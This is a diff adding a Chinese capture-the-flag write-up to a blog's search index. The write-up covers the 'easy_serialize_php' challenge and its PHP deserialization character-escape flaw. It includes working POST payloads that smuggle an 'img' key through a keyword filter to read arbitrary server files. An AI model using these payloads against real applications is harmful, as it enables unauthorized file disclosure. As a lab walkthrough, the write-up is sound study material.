@@ -871,4 +871,54 @@
         <tag>Cyber Grabs</tag>
       </tags>
   </entry>
+  <entry>
+    <title>easy-serialize-php</title>
+    <url>/2022/02/09/easy-serialize-php/</url>
+    <content><![CDATA[<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目涉及到序列化漏洞的字符逃逸</span><br><span class="line">因为到后面序列化写不明白，看了一下大佬的wp</span><br><span class="line">（https://www.jianshu.com/p/8e8117f9fd0e）</span><br></pre></td></tr></table></figure>
+
+<p>进入题目有一个链接里面是源码</p>
+<p><img src="/2022/02/09/easy-serialize-php/1.png" alt="1"></p>
+<p>可以看到我们现在是在index.php网页中</p>
+<p>源码中提示在phpinfo里面由我们需要的东西</p>
+<p>进去看看</p>
+<p><img src="/2022/02/09/easy-serialize-php/2.png" alt="1"></p>
+<p>找到了一个子网页，那么就优先考虑到文件读取</p>
+<p>看了一圈只有最后输出的时候又个file_get_contents函数可以读取文件内容，他读取的文件内容是base64解码之后的img</p>
+<p>继续跟踪一下img，发现是由image_path传送进来的，但是我们输入img的时候会被函数过滤，所以img不可控</p>
+<p>找找别的方法，下面有个反序列化函数是我们可以更改的，那么我们是不是可以构造一个我们的文件来赋值给img来直接进行文件读取呢</p>
+<p>首先我们读取的文件base64：ZDBnM19mMWFnLnBocA==那么我们需要读取的内容就是s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”</p>
+<p>但是我上面有个过滤：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);// 在img中的所有的filter含有的字符串替换成空</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在这里面’php’,’flag’,’php5’,’php4’,’fl1g’会被替换为空</p>
+<p>也就是说</p>
+<p><img src="/2022/02/09/easy-serialize-php/6.png" alt="1"></p>
+<p>这是我们序列化之后的结果，但是经过过滤，它就变成了</p>
+<p><img src="/2022/02/09/easy-serialize-php/7.png" alt="1"></p>
+<p>那么他是否可以继续执行呢？</p>
+<p>这就涉及到字符串逃逸：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为经过过滤，把flag全部替换为空，所以序列化出现了问题，但是可以看到在替换之后<strong>s:24:” ”</strong>后面的24个字符**;s:8:”function”;s:59:”a“<strong>之后又是一个</strong>“;**直接闭合了，那么它会直接运行</p>
+<p>也就是说我们可以依靠这个过滤直接构造一个img来读取到我们想要读取的文件</p>
+<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>
+
+<p>session序列化之后是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤之后就是把<strong>a</strong>赋值给了**;s:51:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
+<p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
+<p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
+<p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
+<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>安洵杯</tag>
+      </tags>
+  </entry>
 </search>
